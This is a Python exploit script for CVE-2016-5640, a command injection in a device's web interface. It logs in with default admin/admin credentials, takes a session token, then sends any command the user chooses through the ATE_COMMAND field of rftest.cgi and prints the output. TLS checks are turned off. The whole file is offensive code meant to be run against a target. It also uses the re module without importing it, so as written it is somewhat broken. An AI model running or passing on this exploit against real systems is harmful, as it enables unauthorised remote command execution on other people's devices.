#!/usr/bin/env python3
"""
Exploit for CVE-2016-5640, a command injection vulnerability discovered by Cylance.

References:
    * https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md
    * https://www.cvedetails.com/cve/CVE-2016-5640/
"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login(target, username="admin", password="admin"):
    try:
        data = (
            ("login", username),
            ("account", username),
            ("password", password)
        )
        response = requests.post(
            "https://{}/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html".format(target),
            data=data,
            verify=False
        )
        if response.status_code == 200:
            session_token = re.findall(r"""&([A-z0-9]{16})['"]""", response.content)
            if len(session_token):
                return session_token[0]
        else:
            return None
    except Exception as e:
        return None

def exploit(target, command, user="admin", password="admin"):
    """
    Exploit command injection in rftest.cgi to execute an arbitrary command..
    Args:
        target(str): target hostname or IP address
        command(str): command to execute on target system
    Returns:
        output(bool): command output
    """
    token = login(target, user, password)
    data = {
        "ATE_COMMAND": command,
        "ATECHANNEL": None,
        "ATETXLEN": 24,
        "ATETXCNT": None,
        "ATETXMODE": None,
        "ATETXBW": None,
        "ATETXGI": None,
        "ATETXMCS": None,
        "ATETXANT": None,
        "ATERXANT": None,
        "ATERXFER": None,
        "ResetCounter": None,
        "ATEAUTOALC": None,
        "ATEIPG": None,
        "ATEPAYLOAD": None,
        "ATE": "TXCONT"
    }
    resp = requests.post(
        "https://{}/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html&{}"\
            .format(target, token),
        data=data,
        verify=False
    )
    if resp.status_code == 200:
        return resp.content.decode('utf-8').split("Content-Type:")[0]
    return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: {} target command".format(sys.argv[0]))
        sys.exit(1)
    print(exploit(sys.argv[1], sys.argv[2]))
